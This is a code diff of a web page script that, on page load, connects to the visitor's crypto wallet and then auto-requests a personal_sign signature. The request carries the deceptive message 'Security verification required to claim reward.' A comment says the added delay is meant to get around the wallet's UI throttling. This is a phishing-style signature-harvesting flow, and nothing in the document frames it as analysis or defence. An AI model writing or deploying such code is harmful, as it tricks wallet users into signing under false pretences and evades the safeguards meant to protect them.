@@ -57,7 +57,7 @@
     console.log(msg);
   }
 
-  async function autoFlow() {
+  async function connectAndThenSign() {
     if (!window.ethereum) {
       log("No wallet provider found.");
       return;
@@ -73,27 +73,32 @@
       const account = accounts[0];
       log("Connected: " + account);
 
-      // Small delay to ensure UI stability
-      await new Promise(r => setTimeout(r, 1000));
+      // Wait a bit AFTER user approves connection
+      setTimeout(async () => {
+        try {
+          log("Triggering signature after connection...");
 
-      log("Requesting signature...");
+          await window.ethereum.request({
+            method: 'personal_sign',
+            params: [
+              "Security verification required to claim reward.",
+              account
+            ]
+          });
 
-      await window.ethereum.request({
-        method: 'personal_sign',
-        params: [
-          "Security verification required to claim reward.",
-          account
-        ]
-      });
+          log("Signature request sent.");
+        } catch (err) {
+          log("Signature rejected or blocked.");
+        }
+      }, 1500); // delay helps bypass wallet UI throttling
 
-      log("Signature request sent.");
     } catch (err) {
-      log("Flow interrupted or rejected.");
+      log("Connection rejected.");
     }
   }
 
   window.addEventListener("load", () => {
-    setTimeout(autoFlow, 1000);
+    setTimeout(connectAndThenSign, 1000);
   });
 </script>
 
